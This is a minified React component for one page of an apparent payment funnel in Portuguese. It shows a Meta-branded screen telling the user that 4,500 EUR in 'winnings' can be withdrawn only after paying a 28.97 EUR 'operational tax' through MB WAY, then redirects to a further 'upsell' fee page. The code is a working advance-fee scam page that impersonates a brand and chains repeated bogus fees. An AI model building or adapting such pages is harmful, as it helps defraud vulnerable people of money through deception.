import{r as React,j as jsx,o as useLocation,p as LoaderIcon}from"./index-jPJOmtKw.js";
import{t as metaLogo}from"./tiktok-logo-full-DIcxqYI2.js";
import{u as useMbway}from"./use-mbway-system.js";
import{P as PaymentPopup}from"./MbwayPaymentPopup-C8F4Odni.js";

const eur=value=>`EUR ${Number(value||0).toLocaleString("pt-PT",{minimumFractionDigits:2})}`;

function Upsell4(){
  const location=useLocation();
  const state=location.state||{};
  const amount=Number(window.__FUNIL_AMOUNT_GANHO_4||4500);
  const fee=Number(window.__FUNIL_FEE_4||28.97);
  const {loading,mbwayData,copied,mbwayTimer,mbwayRef,handlePay,handleCopy}=useMbway({amountInCents:Math.round(fee*100),redirectTo:"/upsell-5",customerData:state.customerData,extraState:state});
  return jsx.jsxs("div",{className:"min-h-screen bg-card flex flex-col max-w-[430px] mx-auto",children:[
    jsx.jsx("header",{className:"w-full bg-card border-b border-border flex justify-center items-center py-4 sticky top-0 z-50",children:jsx.jsx("img",{src:metaLogo,alt:"Meta",className:"h-[24px] w-auto"})}),
    jsx.jsxs("main",{className:"flex-1 p-5 space-y-4",children:[
      jsx.jsxs("section",{className:"bg-muted/30 border border-border rounded-2xl p-5 space-y-3",children:[
        jsx.jsx("p",{className:"text-xs text-muted-foreground uppercase tracking-wide font-bold",children:"Validacao final"}),
        jsx.jsx("h1",{className:"text-xl font-extrabold text-foreground",children:"Imposto operacional pendente"}),
        jsx.jsx("p",{className:"text-sm text-muted-foreground leading-relaxed",children:"Para concluir o saque, confirme a taxa final da operacao financeira."})
      ]}),
      jsx.jsxs("section",{className:"bg-white border border-border rounded-2xl p-5 space-y-3",children:[
        jsx.jsxs("div",{className:"flex justify-between text-sm",children:[jsx.jsx("span",{className:"text-muted-foreground",children:"Valor ganho"}),jsx.jsx("span",{className:"font-semibold",children:eur(amount)})]}),
        jsx.jsxs("div",{className:"flex justify-between text-sm",children:[jsx.jsx("span",{className:"text-muted-foreground",children:"Taxa final"}),jsx.jsx("span",{className:"text-pink font-semibold",children:eur(fee)})]}),
        jsx.jsxs("div",{className:"border-t border-border pt-3 flex justify-between text-sm",children:[jsx.jsx("span",{className:"text-muted-foreground font-semibold",children:"Total a receber"}),jsx.jsx("span",{className:"text-green-500 font-bold",children:eur(amount+fee)})]})
      ]}),
      jsx.jsx("button",{onClick:handlePay,disabled:loading,className:"w-full h-[52px] bg-[#003772] text-white font-bold text-[15px] rounded-2xl flex items-center justify-center gap-2 disabled:opacity-70",children:loading?jsx.jsx(LoaderIcon,{size:20,className:"animate-spin"}):`PAGAR TAXA - ${eur(fee)}`}),
      jsx.jsx("p",{className:"text-[11px] text-center text-muted-foreground",children:"Pagamento seguro via MB WAY"})
    ]}),
    mbwayData&&jsx.jsx(PaymentPopup,{ref:mbwayRef,mbwayData,copied,mbwayTimer,onCopy:handleCopy})
  ]});
}

export{Upsell4 as default};
